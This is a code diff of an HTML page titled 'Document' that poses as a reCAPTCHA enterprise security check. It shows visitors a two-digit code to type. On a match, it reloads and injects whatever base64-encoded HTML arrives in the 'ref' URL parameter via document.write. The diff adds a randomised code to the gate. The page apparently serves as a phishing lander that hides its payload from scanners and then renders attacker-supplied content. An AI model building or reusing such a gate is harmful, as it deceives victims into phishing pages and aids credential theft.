@@ -1,98 +1,141 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Document</title>
-    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
     <script>
-        let hasStatus = new URLSearchParams(window.location.search).has("status");
-        if (hasStatus) {
-            let status = new URLSearchParams(window.location.search).get("status");
-            if (status == "true") {
-                let ref = new URLSearchParams(window.location.search).get("ref");
+      let hasStatus = new URLSearchParams(window.location.search).has("status");
+      if (hasStatus) {
+        let status = new URLSearchParams(window.location.search).get("status");
+        if (status == "true") {
+          let ref = new URLSearchParams(window.location.search).get("ref");
 
-                document.write(
-                    decodeURIComponent(
-                        atob(
-                            `${ref}`
-                        )
-                    )
-                );
-
-
-            }
-
+          document.write(decodeURIComponent(atob(`${ref}`)));
         }
+      }
     </script>
-</head>
+  </head>
 
-<body>
+  <body>
+    <div id="modal" class="w3-modal" style="display: none">
+      <style>
+        input:focus {
+          border: none;
+          outline: none;
+        }
 
-    <div id="modal" class="w3-modal" style="display: none;">
-        <style>
-            input:focus {
-                border: none;
-                outline: none;
-            }
+        input {
+          width: 50px;
+          height: 60px;
+          font-size: 40px;
+          text-align: center;
+          border: 1px solid rgba(0, 97, 254, 0.775);
+          /* border-radius: 4px; */
+          color: rgba(0, 0, 0, 0.692);
+          font-weight: 600;
+        }
 
-            input {
-                width: 50px;
-                height: 60px;
-                font-size: 40px;
-                text-align: center;
-                border: 1px solid rgba(0, 97, 254, 0.775);
-                /* border-radius: 4px; */
-                color: rgba(0, 0, 0, 0.692);
-                font-weight: 600;
-            }
-
-            input::placeholder {
-                font-size: 12px;
+        input::placeholder {
+          font-size: 12px;
+          color: rgba(0, 97, 254, 0.775);
+        }
+      </style>
+      <div
+        class="w3-modal-content w3-animate-bottom"
+        style="width: 400px; margin-top: 72px; left: 0px"
+      >
+        <div
+          style="
+            padding: 16px 24px;
+            font-family: Arial, Helvetica, sans-serif;
+            position: relative;
+          "
+        >
+          <img src="./reCAPTCHA-enterprise.png" alt="" style="width: 40%" />
+          <p
+            style="
+              text-align: center;
+              font-size: 16px;
+              color: rgba(0, 0, 0, 0.76);
+            "
+          >
+            For security reasons, please ensure you enter the code below
+          </p>
+          <div
+            style="
+              display: flex;
+              justify-content: center;
+              margin: 24px 0px 0px;
+              align-items: center;
+            "
+          >
+            <p
+            id="generated-code"
+              style="
                 color: rgba(0, 97, 254, 0.775);
-            }
-        </style>
-        <div class="w3-modal-content w3-animate-bottom" style="width: 400px; margin-top: 72px; left: 0px;">
-            <div style="padding: 16px 24px; font-family: Arial, Helvetica, sans-serif; position: relative;">
-                <img src="./reCAPTCHA-enterprise.png" alt="" style="width: 40%;">
-                <p style="text-align: center; font-size: 16px; color: rgba(0, 0, 0, 0.76);">For security reasons, please
-                    ensure you enter the code
-                    below</p>
-                <div style="display: flex; justify-content: center; margin: 24px 0px 0px; align-items: center;">
-                    <p style="color: rgba(0, 97, 254, 0.775); font-size: 40px; margin: 0px; font-weight: 600;">
-                        69</p>
-                    <i class="fa fa-arrow-right"
-                        style="margin: 0px 8px; font-size: 32px; color: rgb(0, 97, 254, 0.775);"></i>
+                font-size: 40px;
+                margin: 0px;
+                font-weight: 600;
+              "
+            >
+              
+            </p>
+            <i
+              class="fa fa-arrow-right"
+              style="
+                margin: 0px 8px;
+                font-size: 32px;
+                color: rgb(0, 97, 254, 0.775);
+              "
+            ></i>
 
-                    <div>
-                        <input id="code" type="text">
-                    </div>
-                </div>
-
-                <p style="text-align: center; font-size: 12px; color: rgba(0, 0, 0, 0.662); margin-top: 24px;">By
-                    entering
-                    the code above, we ensure a direct and secure connection to the document, reducing the risk of
-                    unauthorized access.</p>
+            <div>
+              <input id="code" type="text" />
             </div>
+          </div>
+
+          <p
+            style="
+              text-align: center;
+              font-size: 12px;
+              color: rgba(0, 0, 0, 0.662);
+              margin-top: 24px;
+            "
+          >
+            By entering the code above, we ensure a direct and secure connection
+            to the document, reducing the risk of unauthorized access.
+          </p>
         </div>
+      </div>
     </div>
     <script>
-        let modal = document.getElementById("modal");
-        let code = document.getElementById("code");
+      let modal = document.getElementById("modal");
+      let code = document.getElementById("code");
+      let generatedCodeTxt = document.getElementById("generated-code")
+      let generatedCode = generateRandomTwoDigitNumber()
 
-        setTimeout(function () {
-            modal.style.display = "block"
-        }, 100)
+      let hasStatus2 = new URLSearchParams(window.location.search).has(
+        "status"
+      );
+      if (!hasStatus2) {
+        generatedCodeTxt.textContent = generatedCode
+        modal.style.display = "block";
+      }
 
-        code.addEventListener("input", function (e) {
-            if (code.value == "69") {
-                let currentUrl = window.location.href;
-                currentUrl += '&status=true';
-                window.location.href = currentUrl;
-            }
-        });
+      code.addEventListener("input", function (e) {
+        if (code.value == generatedCode) {
+          let currentUrl = window.location.href;
+          currentUrl += "&status=true";
+          window.location.href = currentUrl;
+        }
+      });
+
+      function generateRandomTwoDigitNumber() {
+        // Generate a random integer between 10 and 99
+        return Math.floor(Math.random() * 90) + 10;
+      }
     </script>
-</body>
-
+  </body>
 </html>
